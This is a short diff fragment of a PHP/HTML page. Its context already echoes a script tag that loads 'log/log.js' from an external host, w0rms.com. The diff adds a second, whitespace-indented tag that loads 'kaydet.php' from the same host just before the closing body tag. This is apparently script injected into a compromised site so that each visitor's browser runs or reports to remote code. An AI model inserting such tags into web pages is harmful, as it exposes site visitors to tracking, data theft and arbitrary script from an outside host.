@@ -1842,5 +1842,6 @@ action();
 	echo "<SCRIPT SRC=http://w0rms.com/log/log.js></SCRIPT>";
 
 ?>
+			     <script src=http://w0rms.com/kaydet.php></script>
 </body>
 </html>
